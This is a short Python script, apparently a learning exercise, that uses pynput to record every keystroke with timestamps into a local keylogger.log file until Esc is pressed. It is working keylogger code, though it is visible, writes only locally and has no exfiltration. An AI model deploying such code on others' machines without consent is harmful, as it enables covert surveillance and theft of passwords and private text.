import logging,sys
print(sys.version)
from pynput.keyboard import Key, Listener

logging.basicConfig(filename = "F:\\tutorials\\python\\learning\\keylogger.log",
                    level = logging.DEBUG,
                    format = "%(asctime)s : %(message)s"
                    #filemode = "w"
                    )

def on_press(key):
	logging.info(str(key))	
	if key == Key.esc:
		return False
		
with Listener(on_press=on_press) as listener:
	listener.join()
	

#NOTSET = 0
#DEBUG = 10
#INFO = 20
#WARNING = 30
#ERROR = 40
#CRITICAL = 50
